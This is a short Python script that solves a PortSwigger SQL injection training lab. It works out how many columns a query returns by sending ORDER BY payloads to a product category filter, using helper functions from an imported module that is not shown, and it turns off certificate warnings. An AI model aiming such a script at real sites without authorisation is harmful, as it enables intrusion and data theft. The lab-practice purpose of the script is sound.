# Lab 07 — SQL Injection UNION Attack: Determining Number of Columns
# PortSwigger: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
#
# Vulnerability: Product category filter
# Aim:           Find the exact number of columns returned by the query
#
# Technique: Inject ORDER BY n, incrementing n until the DB errors.
#            The last working n is the column count.
#
# Usage: python lab7.py <url>

import sys
import urllib3
from sqli_utils import check_vulnerability, banner, section, get_number_of_columns

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILTER_PATH = "filter"


if __name__ == "__main__":
    banner()
    section("LAB 07 — UNION: DETERMINE COLUMN COUNT")

    if len(sys.argv) != 2:
        print("  Usage: python lab7.py <url>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/") + "/"

    if not check_vulnerability(target, FILTER_PATH):
        print("\n  ✘  Target does not appear vulnerable. Exiting.")
        sys.exit(1)

    get_number_of_columns(target, FILTER_PATH)
